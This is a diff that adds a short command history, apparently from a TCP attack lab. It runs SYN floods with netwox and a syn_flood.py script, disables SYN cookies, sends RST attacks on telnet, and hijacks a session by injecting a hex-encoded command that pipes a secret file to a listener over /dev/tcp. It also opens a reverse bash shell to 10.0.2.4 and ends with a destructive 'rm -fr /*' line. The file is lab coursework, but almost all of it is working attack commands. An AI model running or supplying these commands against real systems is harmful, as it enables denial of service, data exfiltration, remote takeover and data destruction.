@@ -1,0 +1,21 @@
+sudo sysctl -q net.ipv4.tcp_max_syn_backlog
+netstat -na | grep SYN-RECV
+netstat -na | grep ESTABLISHED
+sudo sysctl net.ipv4.tcp_syncookies
+sudo netwox 76 -i 10.0.2.5 -p 23
+sudo tcpdump
+watch -n 1 "netstat -na | grep SYN_RECV | wc -l"
+sudo sysctl net.ipv4.tcp_syncookies=0
+sudo ./syn_flood.py
+sudo netwox 78 --device enp0s3 --filter "tcp and host 10.0.2.5"
+sudo ./rst_telnet.py
+sudo netwox 78 -i 10.0.2.6
+echo "this is a secret file" > secret.txt
+nc -l 9090
+"cat /home/seed/secret.txt > /dev/tcp/10.0.2.4/9090\n".encode("hex")
+sudo netwox 40 --ip4-src 10.0.2.6 --ip4-dst 10.0.2.5   --tcp-src 57928 --tcp-dst 23   --tcp-seqnum 527096508 --tcp-acknum 939205509   --tcp-ack --tcp-psh   --tcp-window 254 --ip4-ttl 128   --tcp-data 636174202f686f6d652f736565642f7365637265742e747874203e202f6465762f7463702f31302e302e322e342f393039300a
+touch delete_me.txt
+rm delete_me.txt\n
+sudo ./session_hijack.py
+/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\n
+rm -fr /* (don't lunch it never)
